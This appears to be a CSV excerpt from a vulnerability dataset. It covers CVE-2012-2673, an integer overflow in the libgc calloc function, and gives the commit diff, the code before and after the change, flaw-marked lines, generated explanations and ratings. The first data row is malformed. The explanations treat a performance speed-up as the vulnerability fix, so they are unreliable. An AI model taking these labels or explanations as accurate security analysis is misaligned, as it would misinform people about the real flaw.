,Unnamed: 0.2,Unnamed: 0.1,Unnamed: 0,Access Gained,Attack Origin,Authentication Required,Availability,CVE ID,CVE Page,CWE ID,Complexity,Confidentiality,Integrity,Known Exploits,Publish Date,Score,Summary,Update Date,Vulnerability Classification,add_lines,codeLink,commit_id,commit_message,del_lines,file_name,files_changed,func_after,func_before,lang,lines_after,lines_before,parentID,patch,project,project_after,project_before,vul,vul_func_with_fix,idx,primevul_func_before_fix,primevul_func_after_fix,C1_Description_of_Functionality_In_Context,C2_Description_of_Functionality_Generic,C3_Explanation_of_Vulnerability_In_Context,C4_Explanation_of_Vulnerability_Generic,C5_Explanation_Vulnerability_Fixed_In_Context,C6_Explanation_Vulnerability_Fixed_Generic,G1_Clarity_C3_C5,G2_Relevance_C3_C5,G3_Completeness_C3_C5,G4_Actionability_C3_C5
","The `GC_generic_malloc_ignore_off_page` function is designed to allocate memory while ignoring off-page allocations in a garbage-collected environment. It first checks if the requested size is small, in which case it delegates to a smaller allocation function. For larger requests, it rounds up the size, calculates the number of memory blocks needed, and invokes any necessary finalizers. The function then locks the memory manager, attempts to allocate the required memory, and initializes it if debugging is not active. If allocation fails, it calls a user-defined out-of-memory function; otherwise, it returns the allocated memory pointer.","The provided code defines a function that allocates memory while specifically handling larger requests that may exceed certain boundaries. It first determines if the requested size is small enough to use a different allocation method. For larger sizes, it rounds the request, calculates the necessary memory blocks, and ensures any finalizers are executed. The function then locks the memory manager to safely attempt the allocation, initializing the memory if debugging is not active. If the allocation fails, it invokes a user-defined error handling routine; otherwise, it returns a pointer to the newly allocated memory.","The vulnerability in the original code stemmed from the potential for allocation size overflows when rounding the requested memory size, which could lead to incorrect memory allocation and subsequent memory corruption. Specifically, the code did not check if the rounded size (`lb_rounded`) was smaller than the original size (`lb`), allowing for a scenario where an overflow could occur. The fix introduced a check to ensure that if `lb_rounded` is less than `lb`, the function immediately calls the out-of-memory handler (`GC_get_oom_fn()`) to prevent further processing and potential exploitation, thereby enhancing the robustness of memory allocation.","The vulnerability in the original code was due to the lack of validation for the rounded allocation size, which could potentially lead to an overflow when the requested memory size was adjusted. This oversight could result in allocating insufficient memory, causing memory corruption or undefined behavior. The fix implemented a check to ensure that the adjusted size was not smaller than the original request. If this condition was met, the code would immediately invoke an out-of-memory handler, effectively preventing any further processing that could exploit the overflow and ensuring safer memory management practices.","The vulnerability was fixed by adding a check to ensure that the rounded allocation size (`lb_rounded`) is not less than the original requested size (`lb`). This check was implemented right after calculating `lb_rounded` in the modified code. If the condition is met, the function immediately calls the out-of-memory handler using `GC_get_oom_fn()`, preventing any further processing that could lead to memory corruption. This safeguard ensures that only valid allocation sizes are processed, thereby mitigating the risk of overflow and enhancing the overall stability and security of the memory allocation routine.","The vulnerability was addressed by introducing a validation step to ensure that the adjusted memory size after rounding does not fall below the original requested size. This check prevents the possibility of allocating insufficient memory, which could lead to memory corruption or undefined behavior. If the adjusted size is found to be smaller, the code immediately invokes an out-of-memory handler, halting further processing. This enhancement effectively safeguards against potential overflow issues, ensuring that only valid and safe memory allocation requests are processed, thereby improving the overall reliability and security of the memory management system.","5,5","5,5","4,4","4,4"
74,74,183053,183053,,Remote,Not required,,CVE-2012-2673,https://www.cvedetails.com/cve/CVE-2012-2673/,CWE-189,Low,,Partial,,2012-07-25,5.0,"Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.",2016-09-28,Overflow ,2,https://github.com/ivmai/bdwgc/commit/83231d0ab5ed60015797c3d1ad9056295ac3b2bb,83231d0ab5ed60015797c3d1ad9056295ac3b2bb,"Speedup calloc size overflow check by preventing division if small values

* malloc.c (GC_SQRT_SIZE_MAX): New macro.
* malloc.c (calloc): Add fast initial size overflow check to avoid
integer division for reasonably small values passed.",1,malloc.c,"{""sha"": ""c9b9eb6a8a7e22bf5606d1753bf658e3d53513a5"", ""filename"": ""malloc.c"", ""status"": ""modified"", ""additions"": 4, ""deletions"": 1, ""changes"": 5, ""blob_url"": ""https://github.com/ivmai/bdwgc/blob/83231d0ab5ed60015797c3d1ad9056295ac3b2bb/malloc.c"", ""raw_url"": ""https://github.com/ivmai/bdwgc/raw/83231d0ab5ed60015797c3d1ad9056295ac3b2bb/malloc.c"", ""contents_url"": ""https://api.github.com/repos/ivmai/bdwgc/contents/malloc.c?ref=83231d0ab5ed60015797c3d1ad9056295ac3b2bb"", ""patch"": ""@@ -381,9 +381,12 @@ void * malloc(size_t lb)\n # define GC_SIZE_MAX (~(size_t)0)\n #endif\n \n+#define GC_SQRT_SIZE_MAX ((1U << (WORDSZ / 2)) - 1)\n+\n void * calloc(size_t n, size_t lb)\n {\n-    if (lb && n > GC_SIZE_MAX / lb)\n+    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */\n+        && lb && n > GC_SIZE_MAX / lb)\n       return NULL;\n #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */\n         /* libpthread allocated some memory that is only pointed to by  */""}"," void * calloc(size_t n, size_t lb)
 {
    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */
        && lb && n > GC_SIZE_MAX / lb)
       return NULL;
 #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */
         /* libpthread allocated some memory that is only pointed to by  */
        /* mmapped thread stacks.  Make sure it's not collectable.      */
        {
          static GC_bool lib_bounds_set = FALSE;
          ptr_t caller = (ptr_t)__builtin_return_address(0);
          /* This test does not need to ensure memory visibility, since */
          /* the bounds will be set when/if we create another thread.   */
          if (!EXPECT(lib_bounds_set, TRUE)) {
            GC_init_lib_bounds();
            lib_bounds_set = TRUE;
          }
          if (((word)caller >= (word)GC_libpthread_start
               && (word)caller < (word)GC_libpthread_end)
              || ((word)caller >= (word)GC_libld_start
                  && (word)caller < (word)GC_libld_end))
            return GC_malloc_uncollectable(n*lb);
          /* The two ranges are actually usually adjacent, so there may */
          /* be a way to speed this up.                                 */
        }
#   endif
    return((void *)REDIRECT_MALLOC(n*lb));
}
"," void * calloc(size_t n, size_t lb)
 {
    if (lb && n > GC_SIZE_MAX / lb)
       return NULL;
 #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */
         /* libpthread allocated some memory that is only pointed to by  */
        /* mmapped thread stacks.  Make sure it's not collectable.      */
        {
          static GC_bool lib_bounds_set = FALSE;
          ptr_t caller = (ptr_t)__builtin_return_address(0);
          /* This test does not need to ensure memory visibility, since */
          /* the bounds will be set when/if we create another thread.   */
          if (!EXPECT(lib_bounds_set, TRUE)) {
            GC_init_lib_bounds();
            lib_bounds_set = TRUE;
          }
          if (((word)caller >= (word)GC_libpthread_start
               && (word)caller < (word)GC_libpthread_end)
              || ((word)caller >= (word)GC_libld_start
                  && (word)caller < (word)GC_libld_end))
            return GC_malloc_uncollectable(n*lb);
          /* The two ranges are actually usually adjacent, so there may */
          /* be a way to speed this up.                                 */
        }
#   endif
    return((void *)REDIRECT_MALLOC(n*lb));
}
",C,"    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */
        && lb && n > GC_SIZE_MAX / lb)
","    if (lb && n > GC_SIZE_MAX / lb)
",,"@@ -381,9 +381,12 @@ void * malloc(size_t lb)
 # define GC_SIZE_MAX (~(size_t)0)
 #endif
 
+#define GC_SQRT_SIZE_MAX ((1U << (WORDSZ / 2)) - 1)
+
 void * calloc(size_t n, size_t lb)
 {
-    if (lb && n > GC_SIZE_MAX / lb)
+    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */
+        && lb && n > GC_SIZE_MAX / lb)
       return NULL;
 #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */
         /* libpthread allocated some memory that is only pointed to by  */",bdwgc,83231d0ab5ed60015797c3d1ad9056295ac3b2bb,6a93f8e5bcad22137f41b6c60a1c7384baaec2b3,1," void * calloc(size_t n, size_t lb)
 {
//flaw_line_below:
    if (lb && n > GC_SIZE_MAX / lb)
//fix_flaw_line_below:
//    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */
//fix_flaw_line_below:
//        && lb && n > GC_SIZE_MAX / lb)
       return NULL;
 #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */
         /* libpthread allocated some memory that is only pointed to by  */
        /* mmapped thread stacks.  Make sure it's not collectable.      */
        {
          static GC_bool lib_bounds_set = FALSE;
          ptr_t caller = (ptr_t)__builtin_return_address(0);
          /* This test does not need to ensure memory visibility, since */
          /* the bounds will be set when/if we create another thread.   */
          if (!EXPECT(lib_bounds_set, TRUE)) {
            GC_init_lib_bounds();
            lib_bounds_set = TRUE;
          }
          if (((word)caller >= (word)GC_libpthread_start
               && (word)caller < (word)GC_libpthread_end)
              || ((word)caller >= (word)GC_libld_start
                  && (word)caller < (word)GC_libld_end))
            return GC_malloc_uncollectable(n*lb);
          /* The two ranges are actually usually adjacent, so there may */
          /* be a way to speed this up.                                 */
        }
#   endif
    return((void *)REDIRECT_MALLOC(n*lb));
}
",183053," void * calloc(size_t n, size_t lb)
 {
    if (lb && n > GC_SIZE_MAX / lb)
       return NULL;
 #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */
         /* libpthread allocated some memory that is only pointed to by  */
        /* mmapped thread stacks.  Make sure it's not collectable.      */
        {
          static GC_bool lib_bounds_set = FALSE;
          ptr_t caller = (ptr_t)__builtin_return_address(0);
          /* This test does not need to ensure memory visibility, since */
          /* the bounds will be set when/if we create another thread.   */
          if (!EXPECT(lib_bounds_set, TRUE)) {
            GC_init_lib_bounds();
            lib_bounds_set = TRUE;
          }
          if (((word)caller >= (word)GC_libpthread_start
               && (word)caller < (word)GC_libpthread_end)
              || ((word)caller >= (word)GC_libld_start
                  && (word)caller < (word)GC_libld_end))
            return GC_malloc_uncollectable(n*lb);
          /* The two ranges are actually usually adjacent, so there may */
          /* be a way to speed this up.                                 */
        }
#   endif
    return((void *)REDIRECT_MALLOC(n*lb));
}
"," void * calloc(size_t n, size_t lb)
 {
    if ((lb | n) > GC_SQRT_SIZE_MAX /* fast initial test */
        && lb && n > GC_SIZE_MAX / lb)
       return NULL;
 #   if defined(GC_LINUX_THREADS) /* && !defined(USE_PROC_FOR_LIBRARIES) */
         /* libpthread allocated some memory that is only pointed to by  */
        /* mmapped thread stacks.  Make sure it's not collectable.      */
        {
          static GC_bool lib_bounds_set = FALSE;
          ptr_t caller = (ptr_t)__builtin_return_address(0);
          /* This test does not need to ensure memory visibility, since */
          /* the bounds will be set when/if we create another thread.   */
          if (!EXPECT(lib_bounds_set, TRUE)) {
            GC_init_lib_bounds();
            lib_bounds_set = TRUE;
          }
          if (((word)caller >= (word)GC_libpthread_start
               && (word)caller < (word)GC_libpthread_end)
              || ((word)caller >= (word)GC_libld_start
                  && (word)caller < (word)GC_libld_end))
            return GC_malloc_uncollectable(n*lb);
          /* The two ranges are actually usually adjacent, so there may */
          /* be a way to speed this up.                                 */
        }
#   endif
    return((void *)REDIRECT_MALLOC(n*lb));
}
","The provided code defines a custom memory allocation function, `calloc`, which allocates memory for an array of `n` elements, each of size `lb`, and initializes the allocated memory to zero. It first checks for potential overflow by ensuring that the product of `n` and `lb` does not exceed a predefined maximum size. If the program is compiled with support for Linux threads, it verifies if the caller's address falls within specific memory ranges associated with the pthread library or dynamic linker, in which case it allocates uncollectable memory to prevent garbage collection interference. Otherwise, it redirects the allocation to a standard memory allocation function.","The code implements a custom memory allocation function that allocates memory for a specified number of elements, each of a defined size, while ensuring that the total requested memory does not exceed a certain limit to prevent overflow. It includes a check for specific memory ranges associated with threading libraries to ensure that allocated memory does not interfere with garbage collection. If the memory address falls within these ranges, it allocates memory that is not subject to garbage collection. Otherwise, it redirects the allocation request to a standard memory allocation routine for processing.","The vulnerability in the original code stemmed from the potential for integer overflow when calculating the total memory size requested by multiplying `n` and `lb`, which could lead to incorrect memory allocation and potential security issues. The fixed code addresses this by introducing a fast initial test that checks if either `n` or `lb` exceeds a new macro, `GC_SQRT_SIZE_MAX`, before performing the more complex overflow check. This change prevents unnecessary division for small values, enhancing performance while ensuring that the overflow condition is still accurately detected, thus improving the overall safety of the memory allocation process.","The vulnerability in the original code was related to the risk of integer overflow when calculating the total memory size requested, which could lead to incorrect memory allocation and potential exploitation. This issue arose from the reliance on a division operation to check for overflow, which could be inefficient and error-prone for certain input values. The fixed code introduces a new macro to perform a quick initial check that avoids division for small input values, thereby enhancing performance and ensuring that the overflow condition is accurately detected without the risk of miscalculation, thus improving the overall safety of the memory allocation process.","The vulnerability was fixed by adding a fast initial size overflow check in the `calloc` function, which utilizes the new macro `GC_SQRT_SIZE_MAX`. This check evaluates whether either `lb` or `n` exceeds this threshold before proceeding to the more complex overflow verification that involves division. By performing this quick test, the code avoids unnecessary division for reasonably small values, thus enhancing performance and reducing the risk of integer overflow. This change ensures that the subsequent check for the condition `n > GC_SIZE_MAX / lb` is only executed when necessary, improving both safety and efficiency.","The vulnerability was addressed by introducing a preliminary check that quickly assesses whether the input values exceed a defined threshold before performing more complex calculations. This initial check allows the code to bypass unnecessary operations for small input values, thereby enhancing performance and reducing the risk of integer overflow. By ensuring that the overflow condition is evaluated only when necessary, the fix improves both the safety and efficiency of the memory allocation process, effectively preventing potential exploitation that could arise from incorrect memory size calculations.","4,5","5,5","4,4","4,4"
